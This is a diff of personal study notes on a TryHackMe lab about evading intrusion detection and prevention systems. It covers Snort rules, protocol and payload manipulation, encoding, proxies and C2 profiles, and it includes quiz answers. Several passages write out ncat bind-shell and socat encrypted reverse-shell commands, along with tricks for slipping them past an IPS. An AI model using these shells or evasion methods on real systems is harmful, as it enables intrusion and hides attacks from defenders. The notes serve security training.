@@ -18,7 +18,6 @@ The following figure shows how Snort can be configured as an IPS if set up inlin
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0925b08163ea115da03213b6fd846296.png)
 
-
 IDS setups can be divided based on their location in the network into:
 
     Host-based IDS (HIDS)
@@ -35,10 +34,8 @@ In the figure below, we use two red circles to show the difference in the covera
 What does an IPS stand for?
 *Intrusion Prevention System*
 
-
 What do you call a system that can detect malicious activity but not stop it?
 *Intrusion Detection System*
-
 
 ### IDS Engine Types 
 
@@ -46,7 +43,6 @@ We can classify network traffic into:
 
     Benign traffic: This is the usual traffic that we expect to have and don’t want the IDS to alert us about.
     Malicious traffic: This is abnormal traffic that we don’t expect to see under normal conditions and consequently want the IDS to detect it.
-
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/96f0a2f30ee8ec440b1b86cd971e4b43.png)
 
@@ -60,7 +56,6 @@ Consequently, the detection engine of an IDS can be:
 Put in another way, signature-based IDS recognizes malicious traffic, so everything that is not malicious is considered benign (normal). This approach is commonly found in anti-virus software, which has a database of known virus signatures. Anything that matches a signature is detected as a virus.
 
 An anomaly-based IDS recognizes normal traffic, so anything that deviates from normal is considered malicious. This approach is more similar to how human beings perceive things; you have certain expectations for speed, performance, and responsiveness when you start your web browser. In other words, you know what “normal” is for your browser. If suddenly you notice that your web browser is too sluggish or unresponsive, you will know that something is wrong. In other words, you knew it when your browser’s performance deviated from normal.
-
 
 What kind of IDS engine has a database of all known malicious packets’ contents?
 *Signature-based*
@@ -105,7 +100,6 @@ alert tcp any any <> any 80 (msg: "Netcat Exploitation"; flow:established,to_ser
 
 If ASCII logging is chosen, the logs would be similar to the two alerts shown next.
 
-
 ```
 
 Snort Logs
@@ -126,15 +120,12 @@ TCP Options (3) => NOP NOP TS: 2244530364 287085341
 
         
 
-
 ```
 
 There are a few points to make about signature-based IDS and its rules. If the attacker made even the slightest changes to avoid using ncat verbatim in their payload, the attack would go unnoticed. As we can conclude, a signature-based IDS or IPS is limited to how well-written and updated its signatures (rules) are. We discuss some evasion techniques in the next task.
 
-
 In the attached file, the logs show that a specific IP address has been detected scanning our system of IP address 10.10.112.168. What is the IP address running the port scan?
 *10.14.17.226*
-
 
 ###  Evasion via Protocol Manipulation 
 
@@ -165,7 +156,6 @@ Rely on a Different Protocol
 The IDS/IPS system might be configured to block certain protocols and allow others. For instance, you might consider using UDP instead of TCP or rely on HTTP instead of DNS to deliver an attack or exfiltrate data. You can use the knowledge you have gathered about the target and the applications necessary for the target organization to design your attack. For instance, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. In one case, the client relied on Google services for their business, so the attacker used Google web hosting to conceal his malicious site. Unfortunately, it is not a one-size-fits-all; moreover, some trial and error might be necessary as long as you don’t create too much noise.
 
 We have an IPS set to block DNS queries and HTTP requests in the figure below. In particular, it enforces the policy where local machines cannot query external DNS servers but should instead query the local DNS server; moreover, it enforces secure HTTP communications. It is relatively permissive when it comes to HTTPS. In this case, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS.
-
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b42ec04cbb84ddd7c08f168be25c4215.png)
 
@@ -256,8 +246,6 @@ If you want to craft your packets with custom fields, whether valid or invalid, 
 
 There is a myriad of other options. Depending on your needs, you might want to check the hping3 manual page for the complete list.
 
-
-
 We use the following Nmap command, nmap -sU -F 10.10.11.122, to launch a UDP scan against our target. What is the option we need to add to set the source port to 161?
 *-g 161*
 
@@ -291,11 +279,8 @@ Start the AttackBox and the attached machine. Consider the following three types
 Which of the above three arguments would return meaningful results when scanning 10.10.11.122?
 *-sF*
 
-![[Pasted image 20220911102118.png]]
-
 What is the option in hping3 to set a custom TCP window size?
 (Refer to hping3 manual page http://www.hping.org/manpage.html (If more than one hping3 option provide the same functionality, use the shorter one.))
-
 
 ### Evasion via Payload Manipulation 
 
@@ -343,7 +328,6 @@ pentester@TryHackMe$ urlencode ncat -lvnp 1234 -e /bin/bash
 ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash
 
         
-
 
 ```
 
@@ -444,7 +428,6 @@ pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify
 
         
 
-
 ```
 
 As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:
@@ -457,7 +440,6 @@ Target Terminal
 pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
 
         
-
 
 ```
 
@@ -502,7 +484,6 @@ input.txt  thm-reverse.crt  thm-reverse.key
 
 ┌──(kali㉿kali)-[~]
 └─$ socat OPENSSL:10.11.81.220:4443,verify=0 EXEC:/bin/bash
-
 
 ┌──(kali㉿kali)-[~/IDS_IPS_evasion]
 └─$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
@@ -553,8 +534,6 @@ Consider the simple case where you want to use Ncat to create a bind shell. The 
     On the other hand, inspecting the payload for ncat - can be evaded by adding an extra white space, such as ncat  - which would still run correctly on the target system.
     If the IDS is looking for ncat, then simple changes to the original command won’t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as nc or socat. Alternatively, you can consider a different encoding if the target system can process it properly.
 
-
-
 Using base64 encoding, what is the transformation of cat /etc/passwd?
 ( Question Hint Write the command to a text file. Make sure you end your command with Enter/Return.)
 
@@ -566,15 +545,11 @@ Using base64 encoding, what is the transformation of cat /etc/passwd?
 Using the provided openssl command above. You created a certificate, which we gave the extension .crt, and a private key, which we gave the extension .key. What is the first line in the certificate file?
 *-----BEGIN CERTIFICATE-----*
 
-
 What is the last line in the private key file?
 *-----END PRIVATE KEY-----*
 
-
 On the attached machine from the previous task, browse to http://10.10.11.122:8080, where you can write your Linux commands. Note that no output will be returned. A command like ncat -lvnp 1234 -e /bin/bash will create a bind shell that you can connect to it from the AttackBox using ncat 10.10.11.122 1234; however, some IPS is filtering out the command we are submitting on the form. Using one of the techniques mentioned in this task, try to adapt the command typed in the form to run properly. Once you connect to the bind shell using ncat 10.10.11.122 1234, find the user’s name.
 Using an extra space should be sufficient to evade the IPS in this case.
-
-![[Pasted image 20220911111759.png]]
 
 ```
 root@ip-10-10-90-128:~# ncat 10.10.11.122 1234
@@ -582,7 +557,6 @@ whoami
 redteamnetsec
 
 ```
-
 
 ### Evasion via Route Manipulation 
 
@@ -608,7 +582,6 @@ Consider the following example. Instead of running nmap -sS 10.10.11.122, you wo
 
 If you use your web browser to connect to the target, it would be a simple task to pass your traffic via a proxy server. Other network tools usually provide their own proxy settings that you can use to hide your traffic source.
 
-
 Protocols used in proxy servers can be HTTP, HTTPS, SOCKS4, and SOCKS5. Which protocols are currently supported by Nmap?
 List in alphabetical order and separate with a single space.
 *HTTP SOCKS4*
@@ -629,7 +602,6 @@ An IDS/IPS requires a high processing power as the number of rules grows and the
 
 It is also worth noting that the target of your attack can be the IDS operator. By causing a vast number of false positives, you can cause operator fatigue against your “adversary.”
 
-
 Make sure you have read and understood the three points of this task.
 *No answer needed*
 
@@ -647,15 +619,10 @@ Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command
 
 This [CobaltStrike Guideline Profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile) shows how a profile is put together.
 
-
-
-
 Which variable would you modify to add a random sleep time between beacon check-ins?
 *Jitter*
 
 ### Next-Gen Security 
-
-
 
 Next-Generation Network IPS (NGNIPS) has the following five characteristics according to [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):
 
@@ -667,22 +634,13 @@ Next-Generation Network IPS (NGNIPS) has the following five characteristics acco
 
 Because a Next-Generation Firewall (NGFW) provides the same functionality as an IPS, it seems that the term NGNIPS is losing popularity for the sake of NGFW. You can read more about NGFW in the Red Team Firewalls room.
 
-
 ### Summary 
-
-
 
 In this room, we covered IDS and IPS types based on installation location and detection engine. We also considered Snort 2 rules as an example of how IDS rules are triggered. To evade detection, one needs to gather as much information as possible about the deployed devices and experiment with different techniques. In other words, trial and error might be inevitable unless one has complete knowledge of the security devices and their configuration.
 
 Using Command and Control (C2) frameworks provides their contribution to IPS evasion via controlling the shape of the traffic to make it as innocuous as it can get. C2 profiles are a critical feature that one should learn to master if they use any C2 framework that supports malleable profiles.
 
-
 Continue your learning with the next room.
 *No answer needed*
-
-
-
-
-
 
 [[Sandbox Evasion]]
